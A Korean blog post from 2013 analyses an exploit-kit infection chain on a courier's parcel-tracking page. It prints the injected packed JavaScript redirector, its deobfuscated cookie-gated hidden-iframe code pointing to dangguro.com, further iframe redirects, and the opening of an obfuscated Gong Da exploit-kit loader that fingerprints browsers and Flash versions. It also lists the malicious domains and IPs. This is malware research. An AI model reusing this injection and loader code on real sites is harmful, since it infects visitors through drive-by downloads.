---
layout: post
title: "The Long Goodbye"
date: 2013-08-29 23:58
comments: true
categories: 
---

EK 가 설치되어 있는 사이트.

G마켓 자체 페이지는 아니고, 배송조회하면 연결되는 택배회사의 배송조회 페이지.

    URL: hxxp://www.yellowcap.co.kr/custom/inquiry_result.asp?INVOICE_NO=81800192001

페이지 소스를 보니,

    <script type="text/javascript" language="javascript" src="/common/js/embed.js"></script>

로 embed.js 를 땡기고 있었다.

embed.js 를 보니, 마지막에 다음과 같은 redirection code 가 들어있었다.

    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
    if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
    e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
    return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
    3.p("<6 s=r://u.w/v/t/q/l.k m=n o=0></6>")}',33,33,
    '||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
    toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))

난독화 해제를 했더니,

    if (document.cookie.indexOf('hsblm=') == -1) {
        var expires = new Date();
        expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
        document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
        document.write("<iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0></iframe>")
    }

로 dangguro.com 으로 traffic 을 돌리는 iframe 을 삽입한다.

    URL: hxxp://dangguro.com/upload/goods/pop/ye.html

ye.html 을 봤더니 

    <iframe src=http://www.zzizile.net//data/geditor/1307/pop/index.html width='1' height='1'></iframe>

로 다시 redirect 한다.

    URL: hxxp://www.zzizile.net//data/geditor/1307/pop/index.html

www.zzizile.net 을 따라가 보았다.

    <script language="javascript" src="http://count5.51yes.com/click.aspx?id=52194144&logo=1" charset="gb2312"></script>
    <script type="text/javascript" src="swfobject.js"></script>
    <script src=jpg.js></script>
    <script type="text/javascript">
    var tmoRu2=navigator.userAgent.toLowerCase();
    var NOmT2="1"+"1"+"1";
    if(document.cookie.indexOf("YCAo6=")==-1 && tmoRu2.indexOf("linux")<=-1 && tmoRu2.indexOf("bot")==-1 && tmoRu2.indexOf("spider")==-1)
    {
    var VJhjJoY8=deconcept.SWFObjectUtil.getPlayerVersion();
    var expires=new Date();
    expires.setTime(expires.getTime()+24*60*60*1000);
    NOmT2="0"+"0";
    document.cookie="YCAo6=Yes;path=/;expires="+expires.toGMTString();
    if(document.location.hostname.length>0){pimOD5="1"+"1";delete pimOD5;try{pimOD5+=
    "0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0";}catch(e){var IzhH1="1";AMJP8 = eval}mOQyUG8=unescape;}
    gROR3="3C7F265941303D6B32471514405B3D4439482417BE6D1343C4453A0FA317510ABF19510EAB045234FF580122B3
    421825FB560261C0511620C225542CD621EE38DA24E031C763FE11DE25E84F9969F319817BBC54CE57EF12B541FA18A501C01FB654
    ...

로 시작하는 heavily obfuscated 된 자바스크립트가 나온다.

swfobject.js 가 있는 것으로 봐서, 여기서부터 Browser fingerprinting 을 해서, 취약한 부분을 찾아내,
적절한 공격을 하는 것으로 보인다.

일단 이 화일을 VirusTotal 에 올려보았다.

45 개의 Anti-virus 엔진중에서 19 개가 악성으로 판정하였다. 국산 엔진들은 잡아내지 못했다.

McAfee 는 JS/Exploit-Godakit.a 라고 판정하고 BitDefender 는 JS:Exploit.BlackHole.AL 이라고 판정하였다.

사용된 화일로 봐서는, Gong Da 가 맞다.

Sandbox 에 넣고 돌렸다.

튀어나오는 URL 들은 

    http://www.uthkorea.com

    http://www.monggus.com

    http://count18.51yes.com

    http://211.43.212.192

    http://101.79.5.31

이다. count18.51yes.com 은 China Telecom Jiangsu 라는 업체에서 호스팅하고 있다.
